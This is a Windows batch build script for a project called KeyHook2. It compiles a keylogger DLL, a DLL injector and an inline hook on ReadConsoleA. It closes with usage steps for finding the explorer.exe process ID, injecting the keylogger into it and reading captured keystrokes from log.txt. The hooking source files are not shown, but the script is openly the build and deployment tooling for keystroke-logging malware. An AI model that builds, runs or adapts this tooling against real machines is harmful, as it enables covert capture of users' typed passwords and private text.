@REM Build script for KeyHook2 project
@REM Automatically sets up Visual Studio environment
@REM Can be run from any command prompt or PowerShell
@REM Usage: build.bat

@echo off
echo ========================================
echo      KeyHook2 Project Build Script
echo ========================================
echo Target Architecture: x64
echo Target Process: explorer.exe
echo.

REM Auto-detect and initialize Visual Studio environment
echo [SETUP] Detecting Visual Studio installation...

REM Try different Visual Studio versions and editions
set VS_FOUND=0

REM Visual Studio 2022 (Community, Professional, Enterprise)
if exist "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat" (
    echo [SETUP] Found Visual Studio 2022 Community
    call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1
    set VS_FOUND=1
) else if exist "C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars64.bat" (
    echo [SETUP] Found Visual Studio 2022 Professional
    call "C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1
    set VS_FOUND=1
) else if exist "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat" (
    echo [SETUP] Found Visual Studio 2022 Enterprise
    call "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1
    set VS_FOUND=1
) else if exist "C:\Program Files\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" (
    echo [SETUP] Found Visual Studio 2022 Build Tools
    call "C:\Program Files\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1
    set VS_FOUND=1
)

REM Visual Studio 2019 fallback
if %VS_FOUND%==0 (
    if exist "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat" (
        echo [SETUP] Found Visual Studio 2019 Community
        call "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1
        set VS_FOUND=1
    ) else if exist "C:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\VC\Auxiliary\Build\vcvars64.bat" (
        echo [SETUP] Found Visual Studio 2019 Professional
        call "C:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1
        set VS_FOUND=1
    ) else if exist "C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\VC\Auxiliary\Build\vcvars64.bat" (
        echo [SETUP] Found Visual Studio 2019 Enterprise
        call "C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1
        set VS_FOUND=1
    ) else if exist "C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvars64.bat" (
        echo [SETUP] Found Visual Studio 2019 Build Tools
        call "C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1
        set VS_FOUND=1
    )
)

if %VS_FOUND%==0 (
    echo [ERROR] Visual Studio not found!
    echo.
    echo Please install one of the following:
    echo   - Visual Studio 2022 Community ^(free^)
    echo   - Visual Studio 2019 Community ^(free^)
    echo   - Visual Studio Build Tools
    echo.
    echo Download from: https://visualstudio.microsoft.com/downloads/
    goto :error
)

echo [SETUP] Visual Studio environment initialized for x64
echo.

REM Create/recreate build output directory
if exist "built" rmdir /s /q "built"
mkdir "built"
echo [SETUP] Created build output directory: built\
echo.

REM Define output names with build directory
set BUILD_DIR=built
set KEYLOGGER_DLL=%BUILD_DIR%\keylogger.dll
set INJECTOR_EXE=%BUILD_DIR%\injector.exe
set INLINE_HOOK_DLL=%BUILD_DIR%\inlinehook.dll

REM Define libraries
set HOOK_LIBS=user32.lib kernel32.lib
set INJECTOR_LIBS=user32.lib kernel32.lib

echo [1/3] Compiling Keyboard Hook DLL...
echo Command: cl /LD /EHsc /Fe%KEYLOGGER_DLL% keyboardhook.cpp %HOOK_LIBS%
cl /LD /EHsc /Fe%KEYLOGGER_DLL% keyboardhook.cpp %HOOK_LIBS%

IF %ERRORLEVEL% NEQ 0 (
    echo [ERROR] Keyboard Hook DLL compilation failed!
    goto :error
) ELSE (
    echo [SUCCESS] %KEYLOGGER_DLL% compiled successfully!
)

echo.
echo [2/3] Compiling DLL Injector...
echo Command: cl /EHsc /Fe%INJECTOR_EXE% ReadConsoleA-injector.cpp %INJECTOR_LIBS%
cl /EHsc /Fe%INJECTOR_EXE% ReadConsoleA-injector.cpp %INJECTOR_LIBS%

IF %ERRORLEVEL% NEQ 0 (
    echo [ERROR] Injector compilation failed!
    goto :error
) ELSE (
    echo [SUCCESS] %INJECTOR_EXE% compiled successfully!
)

echo.
echo [3/3] Compiling Inline Hook DLL (optional)...
echo Command: cl /LD /EHsc /Fe%INLINE_HOOK_DLL% inlinehook.cpp %HOOK_LIBS%
cl /LD /EHsc /Fe%INLINE_HOOK_DLL% inlinehook.cpp %HOOK_LIBS%

IF %ERRORLEVEL% NEQ 0 (
    echo [ERROR] Inline Hook DLL compilation failed!
    goto :error
) ELSE (
    echo [SUCCESS] %INLINE_HOOK_DLL% compiled successfully!
)

echo.
echo ========================================
echo           BUILD SUCCESSFUL!
echo ========================================
echo.
echo Generated files in %BUILD_DIR%\ directory:
echo   - keylogger.dll       (Main keylogger DLL)
echo   - injector.exe        (DLL injector tool)
echo   - inlinehook.dll      (ReadConsoleA hook DLL)
echo.
echo Usage Instructions:
echo   1. Get target process PID: 
echo      Get-Process explorer ^| Select-Object Id
echo.
echo   2. Inject keylogger into explorer.exe:
echo      %BUILD_DIR%\injector.exe [PID] "%CD%\%BUILD_DIR%\keylogger.dll"
echo.
echo   3. Check logs in: log.txt
echo.
goto :end

:error
echo.
echo ========================================
echo            BUILD FAILED!
echo ========================================
echo.
echo If Visual Studio is installed but not detected, try:
echo   1. Restart this script from "x64 Native Tools Command Prompt"
echo   2. Or manually run: vcvars64.bat before this script
echo.
echo If you need to install Visual Studio:
echo   - Visual Studio Community ^(free^): https://visualstudio.microsoft.com/vs/community/
echo   - Build Tools only: https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022
echo.

:end
echo Press any key to exit...
pause >nul